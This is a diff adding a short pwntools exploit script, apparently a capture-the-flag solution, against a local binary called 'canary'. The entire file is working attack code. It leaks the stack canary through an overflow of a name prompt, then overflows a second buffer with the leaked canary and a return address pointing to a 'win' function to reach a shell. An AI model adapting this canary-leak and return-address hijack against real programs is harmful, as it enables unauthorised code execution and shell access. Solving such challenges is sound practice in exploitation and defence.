@@ -1,0 +1,16 @@
+from pwn import *
+
+p = process("./canary")
+e = ELF("./canary")
+
+win = e.symbols['win']
+
+payload = b'A' * (0x128 + 1)
+p.sendafter(b"Your name: ", payload)
+p.recvuntil(payload)
+canary = u64(b'\x00' + p.recv(7))
+payload = b'A' * 0x108 + p64(canary) + b'B' * 8 + p64(win + 5)
+p.sendafter(b"Your feedback: ", payload)
+
+p.interactive()
+# stack allign before system("/bin/sh")
